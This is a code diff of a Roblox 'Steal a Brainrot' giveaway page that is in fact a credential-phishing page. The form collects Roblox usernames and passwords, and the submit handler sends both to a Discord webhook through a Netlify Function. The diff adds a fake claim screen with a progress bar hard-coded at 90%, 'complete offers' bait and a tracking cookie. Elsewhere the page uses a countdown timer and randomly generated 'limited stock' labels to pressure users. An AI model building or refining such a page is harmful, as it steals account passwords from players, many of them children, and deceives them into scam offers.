@@ -49,12 +49,8 @@
             z-index: 0;
         }
         @keyframes gridScroll {
-            0% {
-                background-position: 0 0;
-            }
-            100% {
-                background-position: 40px 40px;
-            }
+            0% { background-position: 0 0; }
+            100% { background-position: 40px 40px; }
         }
 
         .blob {
@@ -66,40 +62,13 @@
             z-index: 0;
             animation: blobFloat 8s ease-in-out infinite;
         }
-        .blob1 {
-            width: 400px;
-            height: 400px;
-            background: var(--hot-pink);
-            top: -100px;
-            left: -100px;
-        }
-        .blob2 {
-            width: 350px;
-            height: 350px;
-            background: var(--electric-blue);
-            bottom: -80px;
-            right: -80px;
-            animation-delay: -3s;
-        }
-        .blob3 {
-            width: 300px;
-            height: 300px;
-            background: var(--purple);
-            top: 40%;
-            left: 60%;
-            animation-delay: -5s;
-        }
+        .blob1 { width: 400px; height: 400px; background: var(--hot-pink); top: -100px; left: -100px; }
+        .blob2 { width: 350px; height: 350px; background: var(--electric-blue); bottom: -80px; right: -80px; animation-delay: -3s; }
+        .blob3 { width: 300px; height: 300px; background: var(--purple); top: 40%; left: 60%; animation-delay: -5s; }
         @keyframes blobFloat {
-            0%,
-            100% {
-                transform: translate(0, 0) scale(1);
-            }
-            33% {
-                transform: translate(20px, -20px) scale(1.05);
-            }
-            66% {
-                transform: translate(-15px, 15px) scale(.95);
-            }
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            33% { transform: translate(20px, -20px) scale(1.05); }
+            66% { transform: translate(-15px, 15px) scale(.95); }
         }
 
         body::after {
@@ -147,23 +116,10 @@
             animation: glitchTitle 6s infinite;
         }
         @keyframes glitchTitle {
-            0%,
-            95%,
-            100% {
-                transform: none;
-                filter: drop-shadow(0 0 30px rgba(255, 45, 120, .5));
-            }
-            96% {
-                transform: translate(-3px, 0) skewX(-5deg);
-                filter: drop-shadow(3px 0 0 var(--electric-blue)) drop-shadow(-3px 0 0 var(--hot-pink));
-            }
-            97% {
-                transform: translate(3px, 0);
-            }
-            98% {
-                transform: translate(-1px, 2px);
-                filter: drop-shadow(0 0 30px rgba(255, 45, 120, .5));
-            }
+            0%, 95%, 100% { transform: none; filter: drop-shadow(0 0 30px rgba(255, 45, 120, .5)); }
+            96% { transform: translate(-3px, 0) skewX(-5deg); filter: drop-shadow(3px 0 0 var(--electric-blue)) drop-shadow(-3px 0 0 var(--hot-pink)); }
+            97% { transform: translate(3px, 0); }
+            98% { transform: translate(-1px, 2px); filter: drop-shadow(0 0 30px rgba(255, 45, 120, .5)); }
         }
         .header .subtitle {
             font-family: 'Fredoka One', cursive;
@@ -171,9 +127,7 @@
             color: #aaa;
             margin-top: 6px;
         }
-        .header .subtitle span {
-            color: var(--neon-green);
-        }
+        .header .subtitle span { color: var(--neon-green); }
 
         .prize-banner {
             display: flex;
@@ -214,17 +168,8 @@
             align-items: flex-start;
             justify-content: center;
         }
-
-        .left-column {
-            flex: 0 0 400px;
-            max-width: 420px;
-            min-width: 340px;
-        }
-        .right-column {
-            flex: 1;
-            max-width: 580px;
-            min-width: 320px;
-        }
+        .left-column { flex: 0 0 400px; max-width: 420px; min-width: 340px; }
+        .right-column { flex: 1; max-width: 580px; min-width: 320px; }
 
         /* ── Card ── */
         .card {
@@ -240,21 +185,15 @@
         .card::before {
             content: '';
             position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
+            top: 0; left: 0; right: 0;
             height: 3px;
             background: linear-gradient(90deg, var(--hot-pink), var(--electric-blue), var(--neon-green), var(--yellow));
             background-size: 200% 100%;
             animation: rainbowSlide 3s linear infinite;
         }
         @keyframes rainbowSlide {
-            0% {
-                background-position: 0% 0%;
-            }
-            100% {
-                background-position: 200% 0%;
-            }
+            0% { background-position: 0% 0%; }
+            100% { background-position: 200% 0%; }
         }
         .card-title {
             font-family: 'Bangers', cursive;
@@ -263,11 +202,7 @@
             margin-bottom: 4px;
             color: #fff;
         }
-        .card-subtitle {
-            font-size: 13px;
-            color: #666;
-            margin-bottom: 20px;
-        }
+        .card-subtitle { font-size: 13px; color: #666; margin-bottom: 20px; }
 
         /* ── Timer ── */
         .timer-banner {
@@ -280,13 +215,8 @@
             animation: timerPulse 1.5s ease-in-out infinite;
         }
         @keyframes timerPulse {
-            0%,
-            100% {
-                box-shadow: 0 0 18px rgba(255, 215, 0, .25);
-            }
-            50% {
-                box-shadow: 0 0 35px rgba(255, 215, 0, .55), 0 0 60px rgba(255, 165, 0, .3);
-            }
+            0%, 100% { box-shadow: 0 0 18px rgba(255, 215, 0, .25); }
+            50% { box-shadow: 0 0 35px rgba(255, 215, 0, .55), 0 0 60px rgba(255, 165, 0, .3); }
         }
         .timer-banner.expired {
             border-color: rgba(255, 80, 80, .5);
@@ -318,9 +248,7 @@
         }
 
         /* ── Form ── */
-        .field {
-            margin-bottom: 16px;
-        }
+        .field { margin-bottom: 16px; }
         label {
             display: block;
             font-family: 'Fredoka One', cursive;
@@ -330,9 +258,7 @@
             color: #888;
             margin-bottom: 6px;
         }
-        .input-wrap {
-            position: relative;
-        }
+        .input-wrap { position: relative; }
         .input-wrap .icon {
             position: absolute;
             left: 13px;
@@ -360,26 +286,11 @@
             background: rgba(0, 207, 255, .05);
             box-shadow: 0 0 0 3px rgba(0, 207, 255, .15);
         }
-        input.error {
-            border-color: var(--hot-pink);
-            box-shadow: 0 0 0 3px rgba(255, 45, 120, .15);
-        }
-        input.success {
-            border-color: var(--neon-green);
-            box-shadow: 0 0 0 3px rgba(0, 255, 136, .15);
-        }
-        .status-msg {
-            margin-top: 5px;
-            font-size: 12px;
-            font-weight: 700;
-            min-height: 16px;
-        }
-        .status-msg.error {
-            color: var(--hot-pink);
-        }
-        .status-msg.success {
-            color: var(--neon-green);
-        }
+        input.error { border-color: var(--hot-pink); box-shadow: 0 0 0 3px rgba(255, 45, 120, .15); }
+        input.success { border-color: var(--neon-green); box-shadow: 0 0 0 3px rgba(0, 255, 136, .15); }
+        .status-msg { margin-top: 5px; font-size: 12px; font-weight: 700; min-height: 16px; }
+        .status-msg.error { color: var(--hot-pink); }
+        .status-msg.success { color: var(--neon-green); }
         .verify-badge {
             position: absolute;
             right: 12px;
@@ -410,22 +321,11 @@
             animation: btnBounce 1.8s ease-in-out infinite;
         }
         @keyframes btnBounce {
-            0%,
-            100% {
-                transform: translateY(0);
-            }
-            15% {
-                transform: translateY(-10px);
-            }
-            30% {
-                transform: translateY(0);
-            }
-            45% {
-                transform: translateY(-5px);
-            }
-            60% {
-                transform: translateY(0);
-            }
+            0%, 100% { transform: translateY(0); }
+            15% { transform: translateY(-10px); }
+            30% { transform: translateY(0); }
+            45% { transform: translateY(-5px); }
+            60% { transform: translateY(0); }
         }
         .btn-submit::before {
             content: '';
@@ -440,34 +340,19 @@
             transform: translateY(-3px);
             box-shadow: 0 10px 35px rgba(255, 45, 120, .6);
         }
-        .btn-submit:hover:not(:disabled)::before {
-            opacity: 1;
-        }
-        .btn-submit:active:not(:disabled) {
-            transform: translateY(0);
-        }
-        .btn-submit:disabled {
-            opacity: .5;
-            cursor: not-allowed;
-            animation: none;
-        }
+        .btn-submit:hover:not(:disabled)::before { opacity: 1; }
+        .btn-submit:active:not(:disabled) { transform: translateY(0); }
+        .btn-submit:disabled { opacity: .5; cursor: not-allowed; animation: none; }
         .btn-submit .spinner {
             display: inline-block;
-            width: 20px;
-            height: 20px;
+            width: 20px; height: 20px;
             border: 3px solid rgba(255, 255, 255, .3);
             border-top-color: #fff;
             border-radius: 50%;
             animation: spin .7s linear infinite;
             vertical-align: middle;
         }
-        .terms {
-            margin-top: 14px;
-            font-size: 11px;
-            color: #444;
-            text-align: center;
-            line-height: 1.5;
-        }
+        .terms { margin-top: 14px; font-size: 11px; color: #444; text-align: center; line-height: 1.5; }
 
         /* ── Right Column: Brainrot Showcase ── */
         .showcase-card {
@@ -487,9 +372,7 @@
         .showcase-card::before {
             content: '';
             position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
+            top: 0; left: 0; right: 0;
             height: 3px;
             background: linear-gradient(90deg, var(--og-gold), var(--secret-purple), var(--og-gold));
             background-size: 200% 100%;
@@ -512,16 +395,10 @@
             mask-image: linear-gradient(to bottom, transparent 0%, black 8%, black 92%, transparent 100%);
             -webkit-mask-image: linear-gradient(to bottom, transparent 0%, black 8%, black 92%, transparent 100%);
         }
-        .scroll-inner {
-            animation: scrollUp 28s linear infinite;
-        }
+        .scroll-inner { animation: scrollUp 28s linear infinite; }
         @keyframes scrollUp {
-            0% {
-                transform: translateY(0);
-            }
-            100% {
-                transform: translateY(-50%);
-            }
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-50%); }
         }
         .brainrot-item {
             display: flex;
@@ -534,12 +411,9 @@
             border-radius: 14px;
             transition: background .2s;
         }
-        .brainrot-item:hover {
-            background: rgba(255, 255, 255, .07);
-        }
+        .brainrot-item:hover { background: rgba(255, 255, 255, .07); }
         .brainrot-img {
-            width: 56px;
-            height: 56px;
+            width: 56px; height: 56px;
             border-radius: 10px;
             object-fit: contain;
             background: rgba(0, 0, 0, .3);
@@ -554,10 +428,7 @@
             border-color: rgba(218, 112, 255, .5);
             box-shadow: 0 0 14px rgba(191, 0, 255, .35);
         }
-        .brainrot-info {
-            flex: 1;
-            min-width: 0;
-        }
+        .brainrot-info { flex: 1; min-width: 0; }
         .brainrot-name {
             font-family: 'Fredoka One', cursive;
             font-size: 14px;
@@ -565,12 +436,7 @@
             line-height: 1.3;
             margin-bottom: 3px;
         }
-        .brainrot-meta {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            flex-wrap: wrap;
-        }
+        .brainrot-meta { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
         .rarity-badge {
             font-family: 'Fredoka One', cursive;
             font-size: 10px;
@@ -585,13 +451,8 @@
             animation: ogGlow 2s ease-in-out infinite;
         }
         @keyframes ogGlow {
-            0%,
-            100% {
-                box-shadow: 0 0 8px rgba(255, 215, 0, .5);
-            }
-            50% {
-                box-shadow: 0 0 22px rgba(255, 215, 0, .9), 0 0 40px rgba(255, 165, 0, .5);
-            }
+            0%, 100% { box-shadow: 0 0 8px rgba(255, 215, 0, .5); }
+            50% { box-shadow: 0 0 22px rgba(255, 215, 0, .9), 0 0 40px rgba(255, 165, 0, .5); }
         }
         .rarity-badge.secret {
             background: linear-gradient(135deg, #bf00ff, #da70ff);
@@ -599,13 +460,8 @@
             animation: secretGlow 2s ease-in-out infinite;
         }
         @keyframes secretGlow {
-            0%,
-            100% {
-                box-shadow: 0 0 8px rgba(191, 0, 255, .5);
-            }
-            50% {
-                box-shadow: 0 0 22px rgba(191, 0, 255, .9), 0 0 40px rgba(218, 112, 255, .5);
-            }
+            0%, 100% { box-shadow: 0 0 8px rgba(191, 0, 255, .5); }
+            50% { box-shadow: 0 0 22px rgba(191, 0, 255, .9), 0 0 40px rgba(218, 112, 255, .5); }
         }
         .stock-indicator {
             font-size: 11px;
@@ -618,13 +474,8 @@
             animation: stockPulseGreen 1.5s ease-in-out infinite;
         }
         @keyframes stockPulseGreen {
-            0%,
-            100% {
-                opacity: 1;
-            }
-            50% {
-                opacity: .55;
-            }
+            0%, 100% { opacity: 1; }
+            50% { opacity: .55; }
         }
         .stock-indicator.out {
             color: #ff5555;
@@ -633,21 +484,21 @@
             opacity: .7;
         }
 
-        /* ── Success Screen ── */
+        /* ── Success / Claim Screen ── */
         #success-screen {
             display: none;
             flex-direction: column;
             align-items: center;
             text-align: center;
             width: 100%;
-            max-width: 520px;
+            max-width: 560px;
             animation: fadeUp .6s ease both;
         }
         .success-card {
             background: var(--card);
             border: 1px solid var(--border);
             border-radius: 24px;
-            padding: 40px 32px;
+            padding: 36px 30px;
             width: 100%;
             position: relative;
             overflow: hidden;
@@ -656,111 +507,98 @@
         .success-card::before {
             content: '';
             position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
+            top: 0; left: 0; right: 0;
             height: 3px;
             background: linear-gradient(90deg, var(--neon-green), var(--electric-blue), var(--neon-green));
             background-size: 200% 100%;
             animation: rainbowSlide 2s linear infinite;
         }
-        .avatar-wrap {
+        /* Lava‑lamp progress bar */
+        .progress-wrap {
+            margin: 0 auto 24px;
+            width: 100%;
+            max-width: 400px;
+        }
+        .progress-bar {
             position: relative;
-            display: inline-block;
-            margin-bottom: 16px;
+            width: 100%;
+            height: 28px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            box-shadow: inset 0 2px 6px rgba(0, 0, 0, 0.4);
         }
-        .avatar-wrap img {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            border: 4px solid var(--neon-green);
-            box-shadow: 0 0 30px rgba(0, 255, 136, .5), 0 0 60px rgba(0, 255, 136, .2);
-            object-fit: cover;
-            display: block;
-            animation: avatarPop .5s .1s cubic-bezier(.34, 1.56, .64, 1) both;
-            background: #1a1a2e;
-        }
-        @keyframes avatarPop {
-            0% {
-                transform: scale(0) rotate(-20deg);
-                opacity: 0;
-            }
-            100% {
-                transform: scale(1) rotate(0);
-                opacity: 1;
-            }
-        }
-        .avatar-ring {
+        .progress-fill {
             position: absolute;
-            inset: -8px;
-            border-radius: 50%;
-            border: 2px solid transparent;
-            background: conic-gradient(var(--neon-green), var(--electric-blue), var(--hot-pink), var(--yellow), var(--neon-green)) border-box;
-            -webkit-mask: linear-gradient(#fff 0 0) padding-box, linear-gradient(#fff 0 0);
-            -webkit-mask-composite: destination-out;
-            mask-composite: exclude;
-            animation: spin 3s linear infinite;
+            left: 0; top: 0; bottom: 0;
+            width: 90%; /* always 90% */
+            background: linear-gradient(90deg, #1e90ff, #8a2be2, #ff69b4);
+            background-size: 300% 100%;
+            animation: lavaFlow 6s ease-in-out infinite;
+            border-radius: 20px;
+            box-shadow: 0 0 20px rgba(138, 43, 226, 0.5);
+            overflow: hidden;
         }
-        .verified-badge {
+        @keyframes lavaFlow {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        /* Bubbles inside the lava lamp */
+        .progress-fill::before {
+            content: '';
             position: absolute;
-            bottom: 2px;
-            right: 2px;
-            background: var(--neon-green);
-            color: #000;
-            border-radius: 50%;
-            width: 26px;
-            height: 26px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 13px;
-            font-weight: 900;
-            border: 3px solid var(--card);
+            top: -5px; left: -10%; width: 200%; height: 200%;
+            background:
+                radial-gradient(ellipse at 20% 50%, rgba(255, 255, 255, 0.4) 0%, transparent 50%),
+                radial-gradient(ellipse at 70% 30%, rgba(255, 255, 255, 0.3) 0%, transparent 50%),
+                radial-gradient(ellipse at 45% 80%, rgba(255, 255, 255, 0.25) 0%, transparent 50%);
+            background-size: 30% 80%, 40% 50%, 35% 60%;
+            background-repeat: no-repeat;
+            animation: bubbleShift 4s ease-in-out infinite alternate;
+            filter: blur(2px);
         }
-        .success-title {
+        @keyframes bubbleShift {
+            0% { transform: translateX(-5%); }
+            100% { transform: translateX(5%); }
+        }
+        .progress-percent {
             font-family: 'Bangers', cursive;
-            font-size: 38px;
+            font-size: 28px;
             letter-spacing: 2px;
+            margin-top: 8px;
+            color: var(--neon-green);
+            text-shadow: 0 0 12px rgba(0, 255, 136, 0.6);
+        }
+        .claim-headline {
+            font-family: 'Bangers', cursive;
+            font-size: 32px;
+            margin-bottom: 6px;
             background: linear-gradient(135deg, var(--neon-green), var(--electric-blue));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
-            margin-bottom: 4px;
+            letter-spacing: 1px;
         }
-        .success-username {
-            font-family: 'Fredoka One', cursive;
-            font-size: 20px;
-            color: #fff;
-            margin-bottom: 10px;
-        }
-        .success-username span {
-            color: var(--yellow);
-        }
-        .success-desc {
-            font-size: 14px;
-            color: #aaa;
-            line-height: 1.6;
-            margin-bottom: 20px;
-        }
-        .success-desc strong {
-            color: var(--neon-green);
+        .claim-subtitle {
+            font-size: 16px;
+            color: #ccc;
+            margin-bottom: 18px;
+            font-weight: 700;
         }
         .offer-steps {
             background: rgba(0, 255, 136, .06);
             border: 1px solid rgba(0, 255, 136, .2);
             border-radius: 12px;
             padding: 16px 18px;
-            font-size: 13px;
+            font-size: 14px;
             color: #bbb;
             margin-bottom: 24px;
             text-align: left;
             line-height: 2;
         }
-        .offer-steps span {
-            color: var(--neon-green);
-            font-weight: 700;
-            font-family: 'Fredoka One', cursive;
-        }
+        .offer-steps span { color: var(--neon-green); font-weight: 700; font-family: 'Fredoka One', cursive; }
         .btn-continue {
             display: block;
             width: 100%;
@@ -782,125 +620,46 @@
             box-shadow: 0 8px 30px rgba(0, 255, 136, .4);
         }
 
-        .confetti-container {
-            position: fixed;
-            inset: 0;
-            pointer-events: none;
-            z-index: 50;
-        }
+        .confetti-container { position: fixed; inset: 0; pointer-events: none; z-index: 50; }
         .confetti-piece {
-            position: absolute;
-            width: 10px;
-            height: 10px;
-            top: -10px;
-            border-radius: 2px;
-            animation: confettiFall linear forwards;
+            position: absolute; width: 10px; height: 10px; top: -10px;
+            border-radius: 2px; animation: confettiFall linear forwards;
         }
         @keyframes confettiFall {
-            0% {
-                transform: translateY(0) rotate(0deg);
-                opacity: 1;
-            }
-            100% {
-                transform: translateY(110vh) rotate(720deg);
-                opacity: 0;
-            }
+            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
         }
-        @keyframes fadeDown {
-            from {
-                opacity: 0;
-                transform: translateY(-20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        @keyframes fadeUp {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-        .floaties {
-            position: fixed;
-            inset: 0;
-            pointer-events: none;
-            z-index: 0;
-            overflow: hidden;
-        }
+        @keyframes fadeDown { from { opacity:0; transform:translateY(-20px); } to { opacity:1; transform:translateY(0); } }
+        @keyframes fadeUp { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }
+        @keyframes spin { to { transform:rotate(360deg); } }
+        .floaties { position: fixed; inset: 0; pointer-events: none; z-index: 0; overflow: hidden; }
         .floaty {
-            position: absolute;
-            font-size: 22px;
-            opacity: .12;
+            position: absolute; font-size: 22px; opacity: .12;
             animation: floatyUp linear infinite;
         }
         @keyframes floatyUp {
-            0% {
-                transform: translateY(110vh) rotate(0deg);
-                opacity: 0;
-            }
-            10% {
-                opacity: .12;
-            }
-            90% {
-                opacity: .12;
-            }
-            100% {
-                transform: translateY(-10vh) rotate(360deg);
-                opacity: 0;
-            }
+            0% { transform: translateY(110vh) rotate(0deg); opacity: 0; }
+            10% { opacity: .12; }
+            90% { opacity: .12; }
+            100% { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
         }
         .general-error {
-            background: rgba(255, 45, 120, .1);
-            border: 1px solid rgba(255, 45, 120, .3);
-            border-radius: 10px;
-            padding: 10px 14px;
-            font-size: 13px;
-            color: var(--hot-pink);
-            font-weight: 700;
-            margin-top: 10px;
-            display: none;
+            background: rgba(255, 45, 120, .1); border: 1px solid rgba(255, 45, 120, .3);
+            border-radius: 10px; padding: 10px 14px; font-size: 13px; color: var(--hot-pink);
+            font-weight: 700; margin-top: 10px; display: none;
         }
 
         /* ── Responsive ── */
         @media (max-width: 900px) {
-            .main-layout {
-                flex-direction: column;
-                align-items: center;
-                gap: 24px;
-            }
-            .left-column {
-                flex: 0 0 auto;
-                max-width: 100%;
-                width: 100%;
-                min-width: 0;
-            }
-            .right-column {
-                max-width: 100%;
-                width: 100%;
-                min-width: 0;
-            }
-            .showcase-card {
-                max-height: 420px;
-            }
-            .header h1 {
-                font-size: clamp(36px, 7vw, 56px);
-            }
+            .main-layout { flex-direction: column; align-items: center; gap: 24px; }
+            .left-column { flex: 0 0 auto; max-width: 100%; width: 100%; min-width: 0; }
+            .right-column { max-width: 100%; width: 100%; min-width: 0; }
+            .showcase-card { max-height: 420px; }
+            .header h1 { font-size: clamp(36px, 7vw, 56px); }
         }
     </style>
 </head>
 <body>
-
     <div class="blob blob1"></div>
     <div class="blob blob2"></div>
     <div class="blob blob3"></div>
@@ -920,20 +679,16 @@
             <div class="prize-tag green">✅ Free Entry</div>
         </div>
 
-        <!-- Two-column layout -->
+        <!-- Two-column layout (visible when not registered) -->
         <div class="main-layout" id="main-layout">
-            <!-- Left: Registration -->
             <div class="left-column" id="register-column">
                 <div class="card" id="register-card">
-                    <!-- Timer -->
                     <div class="timer-banner" id="timer-banner">
                         <div class="timer-label">⏱️ +2 EXTRA BRAINROTS!</div>
                         <div class="timer-countdown" id="timer-display">3:00</div>
                     </div>
-
                     <div class="card-title">Enter the Giveaway</div>
                     <div class="card-subtitle">Fill in your info below. One entry per account.</div>
-
                     <form id="giveaway-form" autocomplete="off">
                         <div class="field">
                             <label>Roblox Username</label>
@@ -961,7 +716,6 @@
                 </div>
             </div>
 
-            <!-- Right: Brainrot Showcase -->
             <div class="right-column" id="showcase-column">
                 <div class="showcase-card">
                     <div class="showcase-title">🧠 BRAINROTS IN STOCK</div>
@@ -972,26 +726,27 @@
             </div>
         </div>
 
-        <!-- Success Screen (hidden initially) -->
+        <!-- Success / Claim Screen (hidden initially) -->
         <div id="success-screen">
             <div class="success-card">
-                <div class="avatar-wrap">
-                    <img id="user-avatar" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='100' height='100'%3E%3Crect fill='%231a1a2e' width='100' height='100'/%3E%3Ctext fill='%2300ff88' font-family='Arial' font-size='36' text-anchor='middle' x='50' y='60'%3E🧠%3C/text%3E%3C/svg%3E" alt="Profile Picture" />
-                    <div class="avatar-ring"></div>
-                    <div class="verified-badge">✓</div>
+                <!-- Lava-lamp progress bar -->
+                <div class="progress-wrap">
+                    <div class="progress-bar">
+                        <div class="progress-fill"></div>
+                    </div>
+                    <div class="progress-percent">90%</div>
                 </div>
-                <div class="success-title">🎉 CLAIM YOUR PRIZE</div>
-                <div class="success-username">Welcome, <span id="display-username"></span>!</div>
-                <p class="success-desc">
-                    Your entry has been <strong>confirmed</strong>.<br>
-                    To receive your Brainrot, complete these quick verification offers:
-                </p>
-                <div class="offer-steps">
+
+                <div class="claim-headline">Almost done!</div>
+                <div class="claim-subtitle">Complete one of these offers to CLAIM YOUR PRIZE!</div>
+
+                <div class="offer-steps" id="offer-steps">
                     <span>1.</span> Verify your Roblox account<br>
                     <span>2.</span> Join the Steal a Brainrot experience<br>
                     <span>3.</span> Claim your reward in-game<br>
                     <span style="color:#ffd700;">⭐</span> <strong style="color:#ffd700;">+2 Bonus Brainrots</strong> if completed within the time limit!
                 </div>
+
                 <button id="continue-button" class="btn-continue">
                     🎮 COMPLETE OFFERS →
                 </button>
@@ -1014,49 +769,38 @@
             { name: 'La Supreme Combinasion', rarity: 'Secret', image: 'la-supreme-combinasion.png' },
         ];
 
-        // Randomize stock status once
         const brainrotsWithStock = brainrotsData.map(b => ({
             ...b,
             stock: Math.random() < 0.5 ? 'limited' : 'out-of-stock'
         }));
 
-        /* ── Build infinite scroll list ── */
         function buildBrainrotItem(b, index) {
             const div = document.createElement('div');
             div.className = 'brainrot-item';
-
             const rarityClass = b.rarity === 'OG' ? 'rarity-og' : 'rarity-secret';
             const stockClass = b.stock === 'limited' ? 'limited' : 'out';
             const stockText = b.stock === 'limited' ? '⚡ Limited Stock' : '🔴 Out of Stock';
-
             div.innerHTML = `
-            <img class="brainrot-img ${rarityClass}" 
-                 src="/brainrots/${b.image}" 
-                 alt="${b.name}" 
-                 loading="lazy"
-                 onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 width=%2756%27 height=%2756%27%3E%3Crect fill=%27%231a1a2e%27 width=%2756%27 height=%2756%27 rx=%2710%27/%3E%3Ctext fill=%27%23888%27 font-family=%27Arial%27 font-size=%2724%27 text-anchor=%27middle%27 x=%2728%27 y=%2734%27%3E🧠%3C/text%3E%3C/svg%3E'"
-            >
-            <div class="brainrot-info">
-              <div class="brainrot-name">${b.name}</div>
-              <div class="brainrot-meta">
-                <span class="rarity-badge ${b.rarity === 'OG' ? 'og' : 'secret'}">${b.rarity}</span>
-                <span class="stock-indicator ${stockClass}">${stockText}</span>
-              </div>
-            </div>
-          `;
+                <img class="brainrot-img ${rarityClass}" 
+                     src="/brainrots/${b.image}" 
+                     alt="${b.name}" 
+                     loading="lazy"
+                     onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 width=%2756%27 height=%2756%27%3E%3Crect fill=%27%231a1a2e%27 width=%2756%27 height=%2756%27 rx=%2710%27/%3E%3Ctext fill=%27%23888%27 font-family=%27Arial%27 font-size=%2724%27 text-anchor=%27middle%27 x=%2728%27 y=%2734%27%3E🧠%3C/text%3E%3C/svg%3E'"
+                >
+                <div class="brainrot-info">
+                  <div class="brainrot-name">${b.name}</div>
+                  <div class="brainrot-meta">
+                    <span class="rarity-badge ${b.rarity === 'OG' ? 'og' : 'secret'}">${b.rarity}</span>
+                    <span class="stock-indicator ${stockClass}">${stockText}</span>
+                  </div>
+                </div>
+            `;
             return div;
         }
 
         const scrollInner = document.getElementById('scroll-inner');
-        // Append original set
-        brainrotsWithStock.forEach((b, i) => {
-            scrollInner.appendChild(buildBrainrotItem(b, i));
-        });
-        // Append duplicate set for seamless infinite scroll
-        brainrotsWithStock.forEach((b, i) => {
-            const clone = buildBrainrotItem(b, i);
-            scrollInner.appendChild(clone);
-        });
+        brainrotsWithStock.forEach((b, i) => scrollInner.appendChild(buildBrainrotItem(b, i)));
+        brainrotsWithStock.forEach((b, i) => scrollInner.appendChild(buildBrainrotItem(b, i)));
 
         /* ── Floaty emojis ── */
         const emojis = ['🧠', '🎮', '⚡', '🔥', '💥', '🎁', '🌀', '👾', '✨', '💀'];
@@ -1092,7 +836,7 @@
         }
 
         /* ── Timer ── */
-        const TIMER_DURATION = 180; // 3 minutes in seconds
+        const TIMER_DURATION = 180;
         let timerRemaining = TIMER_DURATION;
         const timerDisplay = document.getElementById('timer-display');
         const timerBanner = document.getElementById('timer-banner');
@@ -1105,11 +849,7 @@
             const s = seconds % 60;
             return m + ':' + (s < 10 ? '0' : '') + s;
         }
-
-        function updateTimerDisplay() {
-            timerDisplay.textContent = formatTime(timerRemaining);
-        }
-
+        function updateTimerDisplay() { timerDisplay.textContent = formatTime(timerRemaining); }
         function startTimer() {
             updateTimerDisplay();
             timerInterval = setInterval(() => {
@@ -1124,7 +864,6 @@
                 }
             }, 1000);
         }
-
         startTimer();
 
         /* ── Form validation ── */
@@ -1145,7 +884,6 @@
             }
             updateSubmitBtn();
         });
-
         passwordInput.addEventListener('input', () => {
             const v = passwordInput.value;
             passwordInput.classList.remove('error', 'success');
@@ -1163,11 +901,51 @@
             }
             updateSubmitBtn();
         });
-
         function updateSubmitBtn() {
             const usernameOk = usernameInput.value.trim().length >= 3;
             const passwordOk = passwordInput.value.length >= 6;
             submitBtn.disabled = !(usernameOk && passwordOk);
+        }
+
+        /* ── Cookies helpers ── */
+        function setCookie(name, value, days) {
+            const expires = new Date(Date.now() + days * 864e5).toUTCString();
+            document.cookie = name + '=' + encodeURIComponent(value) + '; expires=' + expires + '; path=/; SameSite=Lax';
+        }
+        function getCookie(name) {
+            return document.cookie.split('; ').reduce((r, v) => {
+                const parts = v.split('=');
+                return parts[0] === name ? decodeURIComponent(parts[1]) : r;
+            }, '');
+        }
+
+        /* ── Claim screen activation ── */
+        function showClaimScreen(username, bonusActive) {
+            document.getElementById('main-layout').style.display = 'none';
+            document.getElementById('prize-banner').style.display = 'none';
+            const successScreen = document.getElementById('success-screen');
+            successScreen.style.display = 'flex';
+
+            // Update offer steps based on timer
+            const offerSteps = document.getElementById('offer-steps');
+            if (bonusActive) {
+                offerSteps.innerHTML = `
+                    <span>1.</span> Verify your Roblox account<br>
+                    <span>2.</span> Join the Steal a Brainrot experience<br>
+                    <span>3.</span> Claim your reward in-game<br>
+                    <span style="color:#ffd700;">⭐</span> <strong style="color:#ffd700;">+2 Bonus Brainrots ACTIVE!</strong>
+                `;
+            } else {
+                offerSteps.innerHTML = `
+                    <span>1.</span> Verify your Roblox account<br>
+                    <span>2.</span> Join the Steal a Brainrot experience<br>
+                    <span>3.</span> Claim your reward in-game<br>
+                    <span style="color:#ff6b6b;">⏰</span> <strong style="color:#ff6b6b;">Bonus window expired</strong>
+                `;
+            }
+
+            // Set cookie to remember registration
+            setCookie('brainrot_registered', username, 7);
         }
 
         /* ── Discord webhook via Netlify Function ── */
@@ -1194,7 +972,6 @@
         /* ── Form submit ── */
         document.getElementById('giveaway-form').addEventListener('submit', async (e) => {
             e.preventDefault();
-
             const username = usernameInput.value.trim();
             const password = passwordInput.value;
             const bonusActive = !timerExpired;
@@ -1204,51 +981,9 @@
             submitBtn.innerHTML = '<span class="spinner"></span> Submitting…';
 
             const webhookSent = await sendToWebhook(username, password);
-            if (!webhookSent) {
-                console.log('Webhook delivery issue, but continuing.');
-            }
+            if (!webhookSent) console.log('Webhook delivery issue, but continuing.');
 
-            // Avatar
-            const avatarEl = document.getElementById('user-avatar');
-            const defaultAvatar =
-                `data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='100' height='100'%3E%3Crect fill='%231a1a2e' width='100' height='100'/%3E%3Ctext fill='%2300ff88' font-family='Arial' font-size='36' text-anchor='middle' x='50' y='60'%3E🧠%3C/text%3E%3C/svg%3E`;
-            const robloxAvatarUrl = `https://avatar.rblx.workers.dev/${encodeURIComponent(username)}`;
-            const img = new Image();
